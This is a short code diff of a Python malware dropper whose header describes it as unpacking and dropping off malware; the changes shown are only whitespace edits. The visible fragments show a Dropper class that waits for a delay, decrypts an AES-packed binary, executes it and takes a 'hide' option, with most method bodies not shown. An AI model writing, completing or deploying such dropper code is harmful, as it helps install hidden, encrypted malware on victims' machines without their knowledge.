@@ -2,11 +2,12 @@
 # Author: Pure-L0G1C
 # Description: Unpacks and drops off malware
 
-import zlib 
+import zlib
 from time import sleep
 from lib.file import File
 from lib.aes import CryptoAES
 from lib.pathfinder import Finder
+
 
 class Dropper(object):
 
@@ -33,6 +34,7 @@ class Dropper(object):
         sleep(self.delay)
         self.unpack()
         self.execute()
+
 
 if __name__ == '__main__':
     Dropper(data_name, data_binary, data_key, data_delay, data_hide).start()
